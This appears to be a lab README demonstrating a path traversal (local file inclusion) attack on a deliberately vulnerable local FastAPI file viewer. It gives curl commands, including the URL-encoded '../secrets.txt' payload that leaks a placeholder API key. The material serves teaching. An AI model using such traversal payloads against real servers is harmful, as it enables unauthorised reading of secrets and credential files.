## Prerequisites
First, ensure the vulnerable server (vulnerable.py) is running. When you run this command, the script will automatically create a ./logs/app.log file and a ./secrets.txt file.

```Bash
uvicorn vulnerable:app --reload
```

## Exploitation Steps
The goal is to exploit the file viewer to read files outside of the intended /logs/ directory. The attacker will use a Path Traversal payload (../) to move up one directory and read the secrets.txt file.

1. Perform a Normal File View
Before the attack, we use the API as intended to view a safe file located inside the logs directory.

```Bash
curl "http://127.0.0.1:8000/view-file?filename=app.log"
```

Expected Response (Normal):
```Bash 
The API correctly returns the contents of the app.log file.

INFO: Application started.
```

2. Perform the Exploit (LFI Attack)
Next, the attacker provides a specially crafted payload. This payload must be URL-encoded to handle the ../ special characters.

Note: The payload is ../secrets.txt, which tells the server to go up one directory. This is encoded as %2E%2E%2Fsecrets.txt.

```Bash
curl "http://127.0.0.1:8000/view-file?filename=%2E%2E%2Fsecrets.txt"
```

The vulnerable code in vulnerable.py builds the following file path: ./logs/../secrets.txt

The server's operating system resolves this path. The ./logs/../ part cancels itself out, and the path simply becomes ./secrets.txt.

3. Analyze the Result
The API incorrectly allows access, reads the secrets.txt file from the root directory, and returns its contents to the attacker.


Successful Exploit Response (Secret Leaked):

```Bash
THIS_IS_A_VERY_SECRET_API_KEY_12345
```

This confirms the exploit was successful. The attacker has "traversed" out of the intended directory and read a sensitive file from the server.